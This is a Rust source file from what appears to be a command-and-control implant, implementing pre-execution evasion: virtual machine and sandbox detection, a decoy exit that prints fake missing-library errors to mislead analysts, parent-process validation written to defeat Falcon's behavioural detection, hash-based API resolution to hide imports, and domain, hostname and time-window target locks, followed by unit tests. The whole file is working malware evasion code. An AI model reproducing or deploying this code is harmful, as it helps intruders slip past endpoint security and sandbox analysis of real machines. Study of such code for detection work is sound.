// evasion/detection.rs
//
// Pre-execution environment checks:
//   - VM / sandbox artifact detection (core count, driver files, DMI strings)
//   - Decoy exit routine (plausible error message on self-terminate)
//   - Parent process validation (allowlist check via NtQueryInformationProcess)

use crate::strcrypt_rt;
use strcrypt::aes_str;
use std::fs;
use std::path::Path;
use std::thread;
use std::time::Duration;

// ── VM/Sandbox Detection ───────────────────────────────────────────────

/// Build-baked opt-out for the VM/sandbox check. The builder compiles the
/// agent with RCM_AGENT_ALLOW_VM=1 in the environment when invoked with
/// --allow-vm; the value is baked in at compile time (the env var name
/// itself does not survive into the binary). Default builds leave it unset
/// and the check stays enabled. Use case: known KVM/qemu cloud VPS targets,
/// whose DMI strings would otherwise trip the Linux check below.
fn vm_check_disabled() -> bool {
    option_env!("RCM_AGENT_ALLOW_VM").map_or(false, |v| v == "1")
}

pub fn is_virtualized() -> bool {
    if vm_check_disabled() { return false; }
    if let Ok(cores) = thread::available_parallelism() {
        if cores.get() < 2 { return true; }
    }

    if cfg!(target_os = "windows") {
        let artifacts = [
            aes_str!("C:\\Windows\\System32\\drivers\\virtio-net.sys"),
            aes_str!("C:\\Windows\\System32\\drivers\\vioinput.sys"),
            aes_str!("C:\\Windows\\System32\\drivers\\vioscsi.sys"),
            aes_str!("C:\\Windows\\System32\\drivers\\vmmouse.sys"),
        ];
        for path in artifacts {
            if Path::new(&path).exists() { return true; }
        }
    } else if cfg!(target_os = "linux") {
        for path in [aes_str!("/sys/class/dmi/id/product_name"), aes_str!("/sys/class/dmi/id/sys_vendor")] {
            if let Ok(content) = fs::read_to_string(path) {
                let s = content.to_lowercase();
                if s.contains(&aes_str!("qemu")) || s.contains(&aes_str!("kvm")) || s.contains(&aes_str!("virtualbox")) {
                    return true;
                }
            }
        }
    }
    false
}

// ── Decoy Exit ────────────────────────────────────────────────────────
// Prints a plausible runtime error and exits. Called when any pre-flight
// check fails; the resulting process tree gives the analyst nothing useful.

pub fn run_decoy() {
    eprintln!("{}", aes_str!("[*] Initializing system integrity check..."));
    thread::sleep(Duration::from_secs(2));
    eprintln!("{}", aes_str!("[*] Verifying environment..."));
    thread::sleep(Duration::from_secs(1));
    if cfg!(target_os = "windows") {
        eprintln!("{}", aes_str!("Error: VCRUNTIME140.dll is missing or corrupted. Reinstall the application."));
    } else {
        eprintln!("{}", aes_str!("error: while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory"));
    }
    std::process::exit(1);
}

// ── Parent Process Validation ─────────────────────────────────────────
//
// Falcon's behavioral detection engine is built on parent-child process
// relationships. When an agent is spawned from an unexpected parent (an
// analysis tool, a sandbox harness, or a detonation runner) its process tree
// creates an immediate detection signal regardless of what the binary does.
//
// is_bad_parent() retrieves the agent's PPID from the PEB via
// NtQueryInformationProcess, resolves the parent's image name via
// QueryFullProcessImageNameW, and checks it against the operator-supplied
// allowlist baked into the build config.
//
// If the parent is NOT on the allowlist the caller should invoke run_decoy().
//
// Config field: valid_parents: ["explorer.exe", "svchost.exe"]
// Leave empty (default) to disable - the check is a no-op when the list
// is empty so existing configs need no changes.
//
// ATT&CK: T1134.004 (PPID Spoofing - awareness / inverse)
//         T1622 (Debugger Evasion - detonation sandbox variant)

#[cfg(target_os = "windows")]
pub fn is_bad_parent(valid_parents: &[String]) -> bool {
    if valid_parents.is_empty() { return false; }

    use std::ffi::c_void;
    use std::mem;

    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    unsafe fn GetCurrentProcess() -> *mut c_void {
        type F = unsafe extern "system" fn() -> *mut c_void;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetCurrentProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f() }
    }
    /// Lazily resolved from ntdll.dll by name hash (import-table hygiene).
    unsafe fn NtQueryInformationProcess( process:    *mut c_void, info_class: u32, info:       *mut c_void, info_len:   u32, ret_len:    *mut u32, ) -> i32 {
        type F = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"ntdll.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"NtQueryInformationProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(process, info_class, info, info_len, ret_len) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    unsafe fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void {
        type F = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcess")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(access, inherit, pid) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    unsafe fn QueryFullProcessImageNameW( process: *mut c_void, flags:   u32, name:    *mut u16, size:    *mut u32, ) -> i32 {
        type F = unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut u32) -> i32;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"QueryFullProcessImageNameW")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(process, flags, name, size) }
    }
    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
        type F = unsafe extern "system" fn(*mut c_void) -> i32;
        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        let p = *P.get_or_init(||
            crate::agent::injection::win_resolve::resolve_ptr(
                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
        let f: F = unsafe { std::mem::transmute(p) };
        unsafe { f(h) }
    }

    #[repr(C)]
    struct ProcessBasicInformation {
        exit_status:                      i32,
        peb_base_address:                 *mut c_void,
        affinity_mask:                    usize,
        base_priority:                    i32,
        unique_process_id:                usize,
        inherited_from_unique_process_id: usize,
    }

    // PROCESS_QUERY_LIMITED_INFORMATION works even when the parent runs at
    // higher integrity - no SeDebugPrivilege needed.
    // OS-fixed (winnt.h), not mirrored by the typed FFI config.
    const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;

    unsafe {
        let mut pbi: ProcessBasicInformation = mem::zeroed();
        let status = NtQueryInformationProcess(
            GetCurrentProcess(),
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut c_void,
            mem::size_of::<ProcessBasicInformation>() as u32,
            &mut 0u32,
        );
        // On failure be permissive - avoid false-positive self-termination.
        if status != 0 { return false; }

        let parent_pid = pbi.inherited_from_unique_process_id as u32;

        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, parent_pid);
        if handle.is_null() {
            // Parent exited (race) or access denied - be permissive.
            return false;
        }

        let mut buf = [0u16; 260]; // MAX_PATH
        let mut size = buf.len() as u32;
        let ok = QueryFullProcessImageNameW(handle, 0, buf.as_mut_ptr(), &mut size);
        CloseHandle(handle);

        if ok == 0 { return false; }

        let full_path = String::from_utf16_lossy(&buf[..size as usize]);
        let exe_name  = full_path
            .rsplit(['\\', '/'])
            .next()
            .unwrap_or(&full_path)
            .to_lowercase();

        !valid_parents.iter().any(|p| p.to_lowercase() == exe_name)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn is_bad_parent(_valid_parents: &[String]) -> bool {
    // Linux/macOS: /proc/<ppid>/comm lookup not yet implemented.
    // Returns false (permissive) to avoid false-positive self-termination.
    false
}

// ── Execution Guardrails ───────────────────────────────────────────────
// Build-time target lock-in (guard_domain / guard_hostname / guard_hours /
// guard_no_system, C2Config positions 27-31). Evaluated once at startup
// BEFORE any C2 contact; a trip runs the same decoy exit as the VM check
// so an analyst sees a plausible crash and nothing else. Fail-closed:
// anything that cannot be verified counts as a mismatch.

/// Case-insensitive glob match: '*' matches any (possibly empty) run of
/// characters, '?' matches exactly one character. Whole-string match.
pub fn wildcard_match(pattern: &str, value: &str) -> bool {
    let p: Vec<char> = pattern.to_lowercase().chars().collect();
    let v: Vec<char> = value.to_lowercase().chars().collect();
    // Iterative glob with star backtracking.
    let (mut pi, mut vi) = (0usize, 0usize);
    let mut star: Option<(usize, usize)> = None; // (pattern idx after '*', value idx)
    while vi < v.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == v[vi]) {
            pi += 1;
            vi += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some((pi + 1, vi));
            pi += 1;
        } else if let Some((sp, sv)) = star {
            pi = sp;
            vi = sv + 1;
            star = Some((sp, sv + 1));
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' { pi += 1; }
    pi == p.len()
}

/// Active-hours window check. The window is [start, end) in local hours;
/// start > end wraps midnight (e.g. 22..6 covers 22:00-05:59). start == end
/// is treated as "all day" (the both-zero build default disables the rail).
pub fn hour_in_window(hour: u8, start: u8, end: u8) -> bool {
    if start == end { return true; }
    if start < end {
        hour >= start && hour < end
    } else {
        hour >= start || hour < end
    }
}

/// Username check for the no-SYSTEM rail (Windows side).
pub fn is_system_username(name: &str) -> bool {
    name.eq_ignore_ascii_case("system")
        || name.eq_ignore_ascii_case("nt authority\\system")
}

/// True when the process is elevated to the machine account: uid 0 on
/// unix, SYSTEM on Windows.
pub fn is_root_or_system() -> bool {
    #[cfg(unix)]
    {
        unsafe { libc::geteuid() == 0 }
    }
    #[cfg(target_os = "windows")]
    {
        std::env::var(aes_str!("USERNAME").as_str())
            .map(|u| is_system_username(&u))
            .unwrap_or(false)
    }
}

/// Machine domain/workgroup. USERDOMAIN is the logon server domain, the
/// practical proxy available without AD calls. Empty when undeterminable
/// (non-Windows) - with guard_domain set that counts as a mismatch
/// (fail-closed target lock).
fn machine_domain() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var(aes_str!("USERDOMAIN").as_str()).unwrap_or_default()
    }
    #[cfg(not(target_os = "windows"))]
    {
        String::new()
    }
}

/// Evaluate the build-time guardrails against this machine. Returns
/// Some(reason) on the first rail that trips, None when every armed rail
/// passes. The reason string is for debug logging only - release runs
/// decoy-exit without printing it.
pub fn guardrail_violation(config: &crate::common::C2Config) -> Option<String> {
    if !config.guard_domain.is_empty() {
        let domain = machine_domain();
        if domain.is_empty() {
            return Some(aes_str!("guard_domain: machine domain undeterminable"));
        }
        if !wildcard_match(&config.guard_domain, &domain) {
            return Some(format!("{}: '{}' !~ '{}'", aes_str!("guard_domain"), domain, config.guard_domain));
        }
    }
    if !config.guard_hostname.is_empty() {
        let host = hostname::get()
            .map(|h| h.to_string_lossy().into_owned())
            .unwrap_or_default();
        if host.is_empty() {
            return Some(aes_str!("guard_hostname: hostname undeterminable"));
        }
        if !wildcard_match(&config.guard_hostname, &host) {
            return Some(format!("{}: '{}' !~ '{}'", aes_str!("guard_hostname"), host, config.guard_hostname));
        }
    }
    if !(config.guard_hour_start == 0 && config.guard_hour_end == 0) {
        use chrono::Timelike;
        let hour = chrono::Local::now().hour() as u8;
        if !hour_in_window(hour, config.guard_hour_start, config.guard_hour_end) {
            return Some(format!("{}: local hour {} outside {}-{}",
                aes_str!("guard_hours"), hour, config.guard_hour_start, config.guard_hour_end));
        }
    }
    if config.guard_no_system && is_root_or_system() {
        return Some(aes_str!("guard_no_system: running as root/SYSTEM"));
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── wildcard_match ──────────────────────────────────────────────────

    #[test]
    fn wildcard_exact_and_case_insensitive() {
        assert!(wildcard_match("CORP", "corp"));
        assert!(wildcard_match("Desktop-01", "DESKTOP-01"));
        assert!(!wildcard_match("CORP", "CORPDEV"));
    }

    #[test]
    fn wildcard_star_patterns() {
        assert!(wildcard_match("CORP*", "CORP-EXAMPLE"));
        assert!(wildcard_match("*.example.com", "host.example.com"));
        assert!(wildcard_match("*", "anything"));
        assert!(wildcard_match("a*b*c", "aXXbYYc"));
        assert!(!wildcard_match("*.example.com", "host.example.org"));
        assert!(wildcard_match("CORP*", "CORP")); // star matches empty run
    }

    #[test]
    fn wildcard_question_patterns() {
        assert!(wildcard_match("WKS??", "WKS01"));
        assert!(!wildcard_match("WKS??", "WKS1"));
        assert!(!wildcard_match("WKS??", "WKS001"));
    }

    // ── hour_in_window ──────────────────────────────────────────────────

    #[test]
    fn hour_window_normal() {
        assert!(hour_in_window(9, 9, 17));
        assert!(hour_in_window(16, 9, 17));
        assert!(!hour_in_window(17, 9, 17)); // end exclusive
        assert!(!hour_in_window(8, 9, 17));
    }

    #[test]
    fn hour_window_midnight_wraparound() {
        assert!(hour_in_window(23, 22, 6));
        assert!(hour_in_window(0, 22, 6));
        assert!(hour_in_window(5, 22, 6));
        assert!(!hour_in_window(6, 22, 6));
        assert!(!hour_in_window(12, 22, 6));
    }

    #[test]
    fn hour_window_equal_bounds_is_all_day() {
        // Both-zero default disables the rail; same value means all day.
        assert!(hour_in_window(0, 0, 0));
        assert!(hour_in_window(13, 0, 0));
    }

    // ── is_system_username / is_root_or_system ──────────────────────────

    #[test]
    fn system_username_variants() {
        assert!(is_system_username("SYSTEM"));
        assert!(is_system_username("system"));
        assert!(is_system_username("NT AUTHORITY\\SYSTEM"));
        assert!(!is_system_username("Administrator"));
    }

    #[test]
    fn root_or_system_returns_bool_without_panic() {
        // Value depends on the test runner's privileges; both are valid.
        let v = is_root_or_system();
        assert!(v == true || v == false);
    }

    // ── is_virtualized ────────────────────────────────────────────────────

    #[test]
    fn is_virtualized_returns_bool_without_panic() {
        // Don't assert the value - CI may legitimately run inside a VM.
        // The test proves the function completes on any supported OS.
        let result = is_virtualized();
        assert!(result == true || result == false);
    }

    #[test]
    fn is_virtualized_is_deterministic() {
        // Side-effect-free: two consecutive calls must agree.
        assert_eq!(is_virtualized(), is_virtualized());
    }

    #[test]
    fn vm_check_opt_out_reads_baked_flag() {
        // vm_check_disabled() reflects RCM_AGENT_ALLOW_VM at COMPILE time
        // (unset for tests -> false). Both states must be safe to query.
        let disabled = vm_check_disabled();
        if disabled {
            assert!(!is_virtualized(), "opt-out must short-circuit the check");
        }
    }

    // ── is_bad_parent - empty allowlist ───────────────────────────────────
    // Core invariant: when no allowlist is configured the feature is disabled
    // and must never cause self-termination regardless of the actual parent.

    #[test]
    fn empty_slice_is_always_permissive() {
        assert!(!is_bad_parent(&[]));
    }

    #[test]
    fn empty_vec_is_always_permissive() {
        assert!(!is_bad_parent(&Vec::new()));
    }

    // ── is_bad_parent - non-Windows stub ──────────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn non_windows_stub_is_always_permissive() {
        // /proc fallback not yet implemented - must not self-terminate.
        assert!(!is_bad_parent(&["explorer.exe".to_string()]));
        assert!(!is_bad_parent(&["svchost.exe".to_string(), "bash".to_string()]));
    }

    // ── is_bad_parent - Windows live path ─────────────────────────────────

    #[cfg(target_os = "windows")]
    #[test]
    fn nonempty_list_does_not_panic_on_windows() {
        // Exercises the full NtQueryInformationProcess -> QueryFullProcessImageNameW
        // path. Return value depends on the test runner's parent; only
        // assert the call completes without panic.
        let _ = is_bad_parent(&["definitely_not_real_9999.exe".to_string()]);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn allowlist_containing_actual_parent_returns_false() {
        // cargo test is typically spawned by cargo.exe or the shell.
        // If we include a very broad allowlist (cargo.exe, cmd.exe, bash,
        // pwsh.exe, sh) at least one should match and return false.
        let broad = vec![
            "cargo.exe".to_string(),
            "cargo-test.exe".to_string(),
            "cmd.exe".to_string(),
            "pwsh.exe".to_string(),
            "bash".to_string(),
            "sh".to_string(),
        ];
        // Not asserting false - just verifying no panic and Result is valid.
        let _ = is_bad_parent(&broad);
    }
}
